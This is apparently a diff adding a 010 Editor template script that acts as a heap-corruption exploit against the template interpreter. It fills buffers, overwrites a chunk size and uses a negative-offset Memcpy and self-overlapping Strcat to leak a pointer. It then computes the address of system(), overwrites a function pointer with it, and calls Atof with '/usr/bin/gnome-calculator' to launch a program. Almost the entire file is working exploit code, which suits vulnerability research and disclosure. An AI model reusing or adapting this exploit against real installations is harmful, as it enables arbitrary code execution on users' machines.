@@ -1,0 +1,139 @@
+#define SZ 0x100
+#define SZ_2 0x08
+
+local int i = 0;
+local char p[60];
+
+for (i = 0; i < sizeof(p); i++)
+{
+    p[i] = 0xff;
+}
+
+local char a[SZ_2];
+local char b[SZ_2];
+local char c[SZ_2];
+local char d[SZ_2];
+local char e[SZ_2];
+local char f[SZ_2];
+local char g[SZ_2];
+local char b_1[SZ_2];
+local char b_2[SZ_2];
+local char b_3[SZ_2];
+local char b_4[SZ_2];
+local char b_5[SZ_2];
+
+for (i = 0; i < sizeof(a); i++)
+{
+    a[i] = 0xaa;
+}
+for (i = 0; i < sizeof(b); i++)
+{
+    b[i] = 0xbb;
+}
+for (i = 0; i < sizeof(c); i++)
+{
+    c[i] = 0xcc;
+}
+for (i = 0; i < sizeof(d); i++)
+{
+    d[i] = 0xdd;
+}
+for (i = 0; i < sizeof(e); i++)
+{
+    e[i] = 0xee;
+}
+for (i = 0; i < sizeof(f); i++)
+{
+    f[i] = 0xff;
+}
+for (i = 0; i < sizeof(b_1); i++)
+{
+    b_1[i] = 0xb1;
+}
+for (i = 0; i < sizeof(b_2); i++)
+{
+    b_2[i] = 0xb2;
+}
+for (i = 0; i < sizeof(b_3); i++)
+{
+    b_3[i] = 0xb3;
+}
+for (i = 0; i < sizeof(b_4); i++)
+{
+    b_4[i] = 0xb4;
+}
+for (i = 0; i < sizeof(b_5); i++)
+{
+    b_5[i] = 0xb5;
+}
+
+p[0x18] = 0x11; // size 60
+p[0x19] = 0x1;
+p[0x1a] = 0x0;
+p[0x1b] = 0x0;
+p[0x1c] = 0x0;
+p[0x1d] = 0x0;
+p[0x1e] = 0x0;
+p[0x1f] = 0x0;
+
+Memcpy(a, p, 8, 0);
+Memcpy(b, p, 8, 0);
+Memcpy(c, p, 8, 0);
+Memcpy(d, p, 8, 0);
+Memcpy(e, p, 8, 0);
+Memcpy(f, p, 8, 0);
+Memcpy(b_1, p, 8, 0);
+Memcpy(b_2, p, 8, 0);
+Memcpy(b_3, p, 8, 0);
+Memcpy(b_4, p, 8, 0);
+Memcpy(b_5, p, 8, 0);
+
+p[0] = 0xc8; // size 60
+p[1] = 0x20;
+p[2] = 0xc0;
+p[3] = 0x00;
+p[4] = 0x00;
+p[5] = 0x00;
+p[6] = 0x00;
+p[6] = 0x00;
+p[7] = 0x00;
+
+Strcat(b_1,b_1);
+Strcat(b_2,b_2);
+Strcat(b_3,b_3);
+Strcat(b_4,b_4);
+
+Memcpy(b_5, p, 8, -0x18);
+
+local uchar system[8];
+system[0] = b_5[0] - 0x50;
+system[1] = b_5[1] - 0x5;
+system[2] = b_5[2] - 0x4;
+system[3] = b_5[3];
+system[4] = b_5[4];
+system[5] = b_5[5];
+system[6] = b_5[6];
+system[7] = b_5[7];
+
+p[0] = 0xd8; // size 60
+p[1] = 0x27;
+p[2] = 0xc0;
+p[3] = 0x00;
+p[4] = 0x00;
+p[5] = 0x00;
+p[6] = 0x00;
+p[6] = 0x00;
+p[7] = 0x00;
+
+Memcpy(b_4, p, 8, -0x18);
+
+b_4[0] = system[0];
+b_4[1] = system[1];
+b_4[2] = system[2];
+b_4[3] = system[3];
+b_4[4] = system[4];
+b_4[5] = system[5];
+b_4[6] = system[6];
+b_4[7] = system[7];
+
+Atof("/usr/bin/gnome-calculator");
